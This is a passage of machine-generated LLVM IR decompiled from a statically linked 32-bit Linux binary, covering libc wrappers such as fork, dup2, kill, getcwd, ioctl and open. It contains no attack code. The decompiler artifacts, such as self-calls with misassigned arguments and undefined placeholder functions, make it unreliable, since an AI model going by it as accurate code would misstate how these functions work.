  uselistorder label %dec_label_pc_804f7c8, { 1, 0 }
  uselistorder label %dec_label_pc_804f727, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805005a = call i32 @vfork()
  %v5_805005d = icmp ult i32 %v0_805005a, -4095
  %v1_8050062 = icmp eq i1 %v5_805005d, false
  call void @__pseudo_cond_branch(i1 %v1_8050062, i32 134563100)
  ret i32 %v0_805005a
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805006c = load i32, i32* @edi, align 4
  %v0_805006d = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_8050085 = add i32 %arg2, -12
  %v6_805008b = icmp ugt i32 %v1_8050085, 2
  br i1 %v6_805008b, label %dec_label_pc_805009b, label %dec_label_pc_805008d

dec_label_pc_805008d:                             ; preds = %entry
  %v4_8050091 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8050085)
  br label %dec_label_pc_80500bd

dec_label_pc_805009b:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80500a3 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_80500a3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_80500a3, -4095
  br i1 %tmp, label %dec_label_pc_80500bb, label %dec_label_pc_80500af

dec_label_pc_80500af:                             ; preds = %dec_label_pc_805009b
  %v1_80500af = call i32 @__errno_location(i32 %v0_805006d)
  %v0_80500b4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80500b4 = sub i32 0, %v0_80500b4
  %v2_80500b6 = inttoptr i32 %v1_80500af to i32*
  store i32 %v1_80500b4, i32* %v2_80500b6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80500bb

dec_label_pc_80500bb:                             ; preds = %dec_label_pc_805009b, %dec_label_pc_80500af
  %v0_80500bb = phi i32 [ %v2_80500a3, %dec_label_pc_805009b ], [ -1, %dec_label_pc_80500af ]
  br label %dec_label_pc_80500bd

dec_label_pc_80500bd:                             ; preds = %dec_label_pc_805008d, %dec_label_pc_80500bb
  %v0_80500c2 = phi i32 [ %v4_8050091, %dec_label_pc_805008d ], [ %v0_80500bb, %dec_label_pc_80500bb ]
  store i32 %v0_805006d, i32* @ebx, align 4
  store i32 %v0_805006c, i32* @edi, align 4
  ret i32 %v0_80500c2

; uselistorder directives
  uselistorder i32 %v2_80500a3, { 1, 0, 2 }
  uselistorder i32 %v0_805006d, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80500bd, { 1, 0 }
  uselistorder label %dec_label_pc_80500bb, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80500c4 = load i32, i32* @edi, align 4
  store i32 %v0_80500c4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_80500dc = load i32, i32* @ebx, align 4
  %v1_80500e4 = call i32 @int80_syscall(i32 221)
  store i32 %v1_80500e4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80500e4, -4095
  br i1 %tmp, label %dec_label_pc_80500fc, label %dec_label_pc_80500f0

dec_label_pc_80500f0:                             ; preds = %entry
  %v1_80500f0 = call i32 @__errno_location(i32 %v0_80500dc)
  %v0_80500f5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80500f5 = sub i32 0, %v0_80500f5
  %v2_80500f7 = inttoptr i32 %v1_80500f0 to i32*
  store i32 %v1_80500f5, i32* %v2_80500f7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80500fc

dec_label_pc_80500fc:                             ; preds = %entry, %dec_label_pc_80500f0
  %v0_80500ff = phi i32 [ %v1_80500e4, %entry ], [ -1, %dec_label_pc_80500f0 ]
  %v2_8050101 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050101, i32* %edi.global-to-local, align 4
  ret i32 %v0_80500ff

; uselistorder directives
  uselistorder i32 %v1_80500e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80500fc, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805012c = load i32, i32* @edi, align 4
  store i32 %v0_805012c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8050134 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805013c = call i32 @chdir(i32 %v0_8050134)
  store i32 %v0_8050134, i32* @ebx, align 4
  store i32 %v1_805013c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805013c, -4095
  br i1 %tmp, label %dec_label_pc_8050154, label %dec_label_pc_8050148

dec_label_pc_8050148:                             ; preds = %entry
  %v1_8050148 = call i32 @__errno_location(i32 %v0_8050134)
  %v0_805014d = load i32, i32* %edi.global-to-local, align 4
  %v1_805014d = sub i32 0, %v0_805014d
  %v2_805014f = inttoptr i32 %v1_8050148 to i32*
  store i32 %v1_805014d, i32* %v2_805014f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050154

dec_label_pc_8050154:                             ; preds = %entry, %dec_label_pc_8050148
  %v0_8050155 = phi i32 [ %v1_805013c, %entry ], [ -1, %dec_label_pc_8050148 ]
  %v2_8050154 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050154, i32* @edx, align 4
  %v2_8050158 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050158, i32* @edi, align 4
  ret i32 %v0_8050155

; uselistorder directives
  uselistorder i32 %v1_805013c, { 1, 0, 2 }
  uselistorder i32 %v0_8050134, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050154, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805015c = load i32, i32* @edi, align 4
  store i32 %v0_805015c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050164 = load i32, i32* @ebx, align 4
  %v1_805016c = call i32 @close(i32 %arg1)
  store i32 %v0_8050164, i32* @ebx, align 4
  store i32 %v1_805016c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805016c, -4095
  br i1 %tmp, label %dec_label_pc_8050184, label %dec_label_pc_8050178

dec_label_pc_8050178:                             ; preds = %entry
  %v1_8050178 = call i32 @__errno_location(i32 %v0_8050164)
  %v0_805017d = load i32, i32* %edi.global-to-local, align 4
  %v1_805017d = sub i32 0, %v0_805017d
  %v2_805017f = inttoptr i32 %v1_8050178 to i32*
  store i32 %v1_805017d, i32* %v2_805017f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050184

dec_label_pc_8050184:                             ; preds = %entry, %dec_label_pc_8050178
  %v0_8050185 = phi i32 [ %v1_805016c, %entry ], [ -1, %dec_label_pc_8050178 ]
  %v2_8050184 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050184, i32* @edx, align 4
  %v2_8050188 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050188, i32* @edi, align 4
  ret i32 %v0_8050185

; uselistorder directives
  uselistorder i32 %v1_805016c, { 1, 0, 2 }
  uselistorder i32 %v0_8050164, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050184, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805018c = load i32, i32* @ebx, align 4
  store i32 %v0_805018c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805019f = call i32 @dup2(i32 %v0_805018c, i32 %tmp4)
  store i32 %v2_805019f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805019f, -4095
  br i1 %tmp, label %dec_label_pc_80501b8, label %dec_label_pc_80501ac

dec_label_pc_80501ac:                             ; preds = %entry
  %v0_80501ac = load i32, i32* %stack_var_-4, align 4
  %v1_80501ac = call i32 @__errno_location(i32 %v0_80501ac)
  %v0_80501b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80501b1 = sub i32 0, %v0_80501b1
  %v2_80501b3 = inttoptr i32 %v1_80501ac to i32*
  store i32 %v1_80501b1, i32* %v2_80501b3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80501b8

dec_label_pc_80501b8:                             ; preds = %entry, %dec_label_pc_80501ac
  %v0_80501b9 = phi i32 [ %v2_805019f, %entry ], [ -1, %dec_label_pc_80501ac ]
  %v2_80501bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80501bc, i32* @ebx, align 4
  ret i32 %v0_80501b9

; uselistorder directives
  uselistorder i32 %v2_805019f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80501b8, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80501c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80501c0, i32* %stack_var_-4, align 4
  %v1_80501c9 = call i32 @fork(i32 %v0_80501c0)
  store i32 %v1_80501c9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80501c9, -4095
  br i1 %tmp, label %dec_label_pc_80501e0, label %dec_label_pc_80501d4

dec_label_pc_80501d4:                             ; preds = %entry
  %v0_80501d4 = load i32, i32* %stack_var_-4, align 4
  %v1_80501d4 = call i32 @__errno_location(i32 %v0_80501d4)
  %v0_80501d9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80501d9 = sub i32 0, %v0_80501d9
  %v2_80501db = inttoptr i32 %v1_80501d4 to i32*
  store i32 %v1_80501d9, i32* %v2_80501db, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80501e0

dec_label_pc_80501e0:                             ; preds = %entry, %dec_label_pc_80501d4
  %v0_80501e1 = phi i32 [ %v1_80501c9, %entry ], [ -1, %dec_label_pc_80501d4 ]
  %v2_80501e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80501e0, i32* @edx, align 4
  %v2_80501e4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80501e4, i32* @ebx, align 4
  ret i32 %v0_80501e1

; uselistorder directives
  uselistorder i32 %v1_80501c9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80501e0, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-44, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %v0_80501e8 = load i32, i32* @ebp, align 4
  %v0_80501e9 = load i32, i32* @edi, align 4
  %v0_80501ea = load i32, i32* @esi, align 4
  %v0_80501eb = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80501f7 = icmp eq i32 %arg2, 0
  %v1_80501f9 = icmp eq i1 %v1_80501f7, false
  %v1_8050223 = icmp eq i32 %arg1, 0
  br i1 %v1_80501f9, label %dec_label_pc_8050223, label %dec_label_pc_80501fb

dec_label_pc_80501fb:                             ; preds = %entry
  br i1 %v1_8050223, label %dec_label_pc_805020f, label %dec_label_pc_80501ff

dec_label_pc_80501ff:                             ; preds = %dec_label_pc_80501fb
  %v1_80501ff = call i32 @__errno_location(i32 %v0_80501eb)
  %v1_8050204 = inttoptr i32 %v1_80501ff to i32*
  store i32 22, i32* %v1_8050204, align 4
  br label %dec_label_pc_8050294

dec_label_pc_805020f:                             ; preds = %dec_label_pc_80501fb
  %v3_805020f = call i32 @__GI_getpagesize(i32 %v0_80501eb, i32 %v0_80501ea, i32 %v0_80501e9)
  %v1_8050219 = add i32 %v3_805020f, -4096
  %v3_8050219 = sub i32 4095, %v3_805020f
  %v4_8050219 = and i32 %v3_8050219, %v3_805020f
  %v5_8050219 = icmp slt i32 %v4_8050219, 0
  %v7_8050219 = icmp slt i32 %v1_8050219, 0
  %v2_805021e = icmp eq i1 %v7_8050219, %v5_8050219
  %v5_805021e = select i1 %v2_805021e, i32 %v3_805020f, i32 4096
  store i32 %v5_805021e, i32* @ebx, align 4
  br label %dec_label_pc_805022b

dec_label_pc_8050223:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8050229 = icmp eq i1 %v1_8050223, false
  br i1 %v1_8050229, label %dec_label_pc_805023d, label %dec_label_pc_805022b

dec_label_pc_805022b:                             ; preds = %dec_label_pc_8050223, %dec_label_pc_805020f
  %v0_805022e = phi i32 [ %arg2, %dec_label_pc_8050223 ], [ %v5_805021e, %dec_label_pc_805020f ]
  store i32 %v0_805022e, i32* %stack_var_-44, align 4
  %v1_805022f = call i32 @malloc(i32 %v0_805022e)
  %v1_8050237 = icmp eq i32 %v1_805022f, 0
  store i32 %v1_805022f, i32* @esi, align 4
  br i1 %v1_8050237, label %dec_label_pc_8050294, label %dec_label_pc_805022b.dec_label_pc_805023d_crit_edge

dec_label_pc_805022b.dec_label_pc_805023d_crit_edge: ; preds = %dec_label_pc_805022b
  %v0_8050248.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_805023d

dec_label_pc_805023d:                             ; preds = %dec_label_pc_805022b.dec_label_pc_805023d_crit_edge, %dec_label_pc_8050223
  %v0_8050248 = phi i32 [ %v0_8050248.pre, %dec_label_pc_805022b.dec_label_pc_805023d_crit_edge ], [ %tmp12, %dec_label_pc_8050223 ]
  %v0_805023d = phi i32 [ %v1_805022f, %dec_label_pc_805022b.dec_label_pc_805023d_crit_edge ], [ %arg1, %dec_label_pc_8050223 ]
  store i32 %v0_805023d, i32* @ebx, align 4
  %v2_8050248 = call i32 @getcwd(i32 %v0_8050248, i32 %tmp13)
  %v0_805024a = load i32, i32* @ebx, align 4
  store i32 %v0_805024a, i32* @edx, align 4
  store i32 %v2_8050248, i32* @ebx, align 4
  %tmp = icmp ult i32 %v2_8050248, -4095
  br i1 %tmp, label %dec_label_pc_8050260, label %dec_label_pc_8050255

dec_label_pc_8050255:                             ; preds = %dec_label_pc_805023d
  %v0_8050255 = load i32, i32* %stack_var_-44, align 4
  %v1_8050255 = call i32 @__errno_location(i32 %v0_8050255)
  %v0_805025a = load i32, i32* @ebx, align 4
  %v1_805025a = sub i32 0, %v0_805025a
  store i32 %v1_805025a, i32* @ebx, align 4
  %v2_805025c = inttoptr i32 %v1_8050255 to i32*
  store i32 %v1_805025a, i32* %v2_805025c, align 4
  br label %dec_label_pc_8050282

dec_label_pc_8050260:                             ; preds = %dec_label_pc_805023d
  %v2_8050260 = icmp slt i32 %v2_8050248, 0
  br i1 %v2_8050260, label %dec_label_pc_8050282, label %dec_label_pc_8050264

dec_label_pc_8050264:                             ; preds = %dec_label_pc_8050260
  %v0_8050264 = load i32, i32* @edi, align 4
  %v1_8050264 = icmp eq i32 %v0_8050264, 0
  %v1_8050266 = icmp eq i1 %v1_8050264, false
  br i1 %v1_8050266, label %dec_label_pc_8050296, label %dec_label_pc_8050268

dec_label_pc_8050268:                             ; preds = %dec_label_pc_8050264
  br i1 %v1_80501f9, label %dec_label_pc_805027e, label %dec_label_pc_805026c

dec_label_pc_805026c:                             ; preds = %dec_label_pc_8050268
  %v0_805026f = load i32, i32* @esi, align 4
  store i32 %v0_805026f, i32* %stack_var_-44, align 4
  %v4_8050270 = inttoptr i32 %v0_805026f to i32*
  %v5_8050270 = call i32 @realloc(i32* %v4_8050270, i32 %v2_8050248, i32 %v0_805024a, i32 %v0_805024a)
  %v1_8050278 = icmp eq i32 %v5_8050270, 0
  %v1_805027c = icmp eq i1 %v1_8050278, false
  br i1 %v1_805027c, label %dec_label_pc_8050296, label %dec_label_pc_805027e

dec_label_pc_805027e:                             ; preds = %dec_label_pc_805026c, %dec_label_pc_8050268
  %v0_805027e = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050296

dec_label_pc_8050282:                             ; preds = %dec_label_pc_8050260, %dec_label_pc_8050255
  %v0_8050282 = load i32, i32* @edi, align 4
  %v1_8050282 = icmp eq i32 %v0_8050282, 0
  %v1_8050284 = icmp eq i1 %v1_8050282, false
  br i1 %v1_8050284, label %dec_label_pc_8050294, label %dec_label_pc_8050286

dec_label_pc_8050286:                             ; preds = %dec_label_pc_8050282
  %v0_8050289 = load i32, i32* @esi, align 4
  store i32 %v0_8050289, i32* %stack_var_-44, align 4
  %v1_805028a = call i32 @free(i32 %v0_8050289)
  %v0_8050299.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050296

dec_label_pc_8050294:                             ; preds = %dec_label_pc_8050282, %dec_label_pc_805022b, %dec_label_pc_80501ff
  br label %dec_label_pc_8050296

dec_label_pc_8050296:                             ; preds = %dec_label_pc_805026c, %dec_label_pc_8050264, %dec_label_pc_8050286, %dec_label_pc_805027e, %dec_label_pc_8050294
  %v0_8050299 = phi i32 [ %v5_8050270, %dec_label_pc_805026c ], [ %v0_8050264, %dec_label_pc_8050264 ], [ %v0_8050299.pre, %dec_label_pc_8050286 ], [ %v0_805027e, %dec_label_pc_805027e ], [ 0, %dec_label_pc_8050294 ]
  %v0_8050296 = load i32, i32* @esp, align 4
  %v5_8050296 = icmp ugt i32 %v0_8050296, -13
  store i1 %v5_8050296, i1* @cf, align 1
  store i32 %v0_80501eb, i32* @ebx, align 4
  store i32 %v0_80501ea, i32* @esi, align 4
  store i32 %v0_80501e9, i32* @edi, align 4
  store i32 %v0_80501e8, i32* @ebp, align 4
  ret i32 %v0_8050299

; uselistorder directives
  uselistorder i32 %v2_8050248, { 1, 3, 0, 2 }
  uselistorder i32 %v0_805022e, { 1, 0 }
  uselistorder i32 %v3_805020f, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 -13, { 1, 0 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8050296, { 4, 2, 3, 0, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_80502a3 = ptrtoint i32* %stack_var_-8 to i32
  %v2_80502aa = call i32 @getrlimit(i32 7, i32 %v2_80502a3)
  store i32 256, i32* @edx, align 4
  %v2_80502b7 = icmp slt i32 %v2_80502aa, 0
  br i1 %v2_80502b7, label %dec_label_pc_80502bf, label %dec_label_pc_80502bb

dec_label_pc_80502bb:                             ; preds = %entry
  %v3_80502bb = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80502bb, i32* @edx, align 4
  br label %dec_label_pc_80502bf

dec_label_pc_80502bf:                             ; preds = %entry, %dec_label_pc_80502bb
  %v0_80502bf = phi i32 [ 256, %entry ], [ %v3_80502bb, %dec_label_pc_80502bb ]
  ret i32 %v0_80502bf

; uselistorder directives
  uselistorder label %dec_label_pc_80502bf, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_80502c8 = load i32, i32* @global_var_80687d0.694, align 16
  store i32 %v0_80502c8, i32* @edx, align 4
  %v1_80502d3 = icmp eq i32 %v0_80502c8, 0
  %v1_80502d5 = icmp eq i1 %v1_80502d3, false
  %v4_80502d5 = select i1 %v1_80502d5, i32 %v0_80502c8, i32 4096
  ret i32 %v4_80502d5
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80502dc = load i32, i32* @ebx, align 4
  store i32 %v0_80502dc, i32* %stack_var_-4, align 4
  %v1_80502e5 = call i32 @getpid(i32 %v0_80502dc)
  store i32 %v1_80502e5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80502e5, -4095
  br i1 %tmp, label %dec_label_pc_80502fc, label %dec_label_pc_80502f0

dec_label_pc_80502f0:                             ; preds = %entry
  %v0_80502f0 = load i32, i32* %stack_var_-4, align 4
  %v1_80502f0 = call i32 @__errno_location(i32 %v0_80502f0)
  %v0_80502f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502f5 = sub i32 0, %v0_80502f5
  %v2_80502f7 = inttoptr i32 %v1_80502f0 to i32*
  store i32 %v1_80502f5, i32* %v2_80502f7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80502fc

dec_label_pc_80502fc:                             ; preds = %entry, %dec_label_pc_80502f0
  %v0_80502fd = phi i32 [ %v1_80502e5, %entry ], [ -1, %dec_label_pc_80502f0 ]
  %v2_8050300 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050300, i32* @ebx, align 4
  ret i32 %v0_80502fd

; uselistorder directives
  uselistorder i32 %v1_80502e5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80502fc, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050304 = load i32, i32* @ebx, align 4
  store i32 %v0_8050304, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8050317 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8050317, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050317, -4095
  br i1 %tmp, label %dec_label_pc_8050330, label %dec_label_pc_8050324

dec_label_pc_8050324:                             ; preds = %entry
  %v0_8050324 = load i32, i32* %stack_var_-4, align 4
  %v1_8050324 = call i32 @__errno_location(i32 %v0_8050324)
  %v0_8050329 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050329 = sub i32 0, %v0_8050329
  %v2_805032b = inttoptr i32 %v1_8050324 to i32*
  store i32 %v1_8050329, i32* %v2_805032b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050330

dec_label_pc_8050330:                             ; preds = %entry, %dec_label_pc_8050324
  %v0_8050331 = phi i32 [ %v1_8050317, %entry ], [ -1, %dec_label_pc_8050324 ]
  %v2_8050334 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050334, i32* @ebx, align 4
  ret i32 %v0_8050331

; uselistorder directives
  uselistorder i32 %v1_8050317, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050330, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8050338 = load i32, i32* @edi, align 4
  store i32 %v0_8050338, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8050350 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050358 = call i32 @ioctl(i32 %v0_8050350, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8050350, i32* @ebx, align 4
  store i32 %v3_8050358, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8050358, -4095
  br i1 %tmp, label %dec_label_pc_8050370, label %dec_label_pc_8050364

dec_label_pc_8050364:                             ; preds = %entry
  %v1_8050364 = call i32 @__errno_location(i32 %v0_8050350)
  %v0_8050369 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050369 = sub i32 0, %v0_8050369
  %v2_805036b = inttoptr i32 %v1_8050364 to i32*
  store i32 %v1_8050369, i32* %v2_805036b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050370

dec_label_pc_8050370:                             ; preds = %entry, %dec_label_pc_8050364
  %v0_8050373 = phi i32 [ %v3_8050358, %entry ], [ -1, %dec_label_pc_8050364 ]
  %v2_8050375 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050375, i32* @edi, align 4
  ret i32 %v0_8050373

; uselistorder directives
  uselistorder i32 %v3_8050358, { 1, 0, 2 }
  uselistorder i32 %v0_8050350, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050370, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050378 = load i32, i32* @ebx, align 4
  store i32 %v0_8050378, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805038b = call i32 @kill(i32 %v0_8050378, i32 %tmp4)
  store i32 %v2_805038b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805038b, -4095
  br i1 %tmp, label %dec_label_pc_80503a4, label %dec_label_pc_8050398

dec_label_pc_8050398:                             ; preds = %entry
  %v0_8050398 = load i32, i32* %stack_var_-4, align 4
  %v1_8050398 = call i32 @__errno_location(i32 %v0_8050398)
  %v0_805039d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805039d = sub i32 0, %v0_805039d
  %v2_805039f = inttoptr i32 %v1_8050398 to i32*
  store i32 %v1_805039d, i32* %v2_805039f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503a4

dec_label_pc_80503a4:                             ; preds = %entry, %dec_label_pc_8050398
  %v0_80503a5 = phi i32 [ %v2_805038b, %entry ], [ -1, %dec_label_pc_8050398 ]
  %v2_80503a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80503a4, i32* @edx, align 4
  %v2_80503a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80503a8, i32* @ebx, align 4
  ret i32 %v0_80503a5

; uselistorder directives
  uselistorder i32 %v2_805038b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80503a4, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_80503af = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_80503b3 = sdiv i32 %sext, 16777216
  store i32 %v4_80503b3, i32* @ecx, align 4
  %v4_80503b7 = ptrtoint i8* %arg1 to i32
  %v3_80503bb = and i32 %arg2, 64
  %v4_80503bb = icmp eq i32 %v3_80503bb, 0
  br i1 %v4_80503bb, label %dec_label_pc_80503cc, label %dec_label_pc_80503c0

dec_label_pc_80503c0:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_80503cc

dec_label_pc_80503cc:                             ; preds = %entry, %dec_label_pc_80503c0
  %v0_80503cc = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_80503c0 ]
  store i32 %v0_80503cc, i32* @edx, align 4
  store i32 %v4_80503b7, i32* %ebx.global-to-local, align 4
  %v5_80503d7 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_80503b3)
  store i32 %v5_80503d7, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_80503d7, -4095
  br i1 %tmp15, label %dec_label_pc_80503ef, label %dec_label_pc_80503e3

dec_label_pc_80503e3:                             ; preds = %dec_label_pc_80503cc
  %v1_80503e3 = call i32 @__errno_location(i32 %v0_80503af)
  %v0_80503e8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80503e8 = sub i32 0, %v0_80503e8
  %v2_80503ea = inttoptr i32 %v1_80503e3 to i32*
  store i32 %v1_80503e8, i32* %v2_80503ea, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503ef

dec_label_pc_80503ef:                             ; preds = %dec_label_pc_80503cc, %dec_label_pc_80503e3
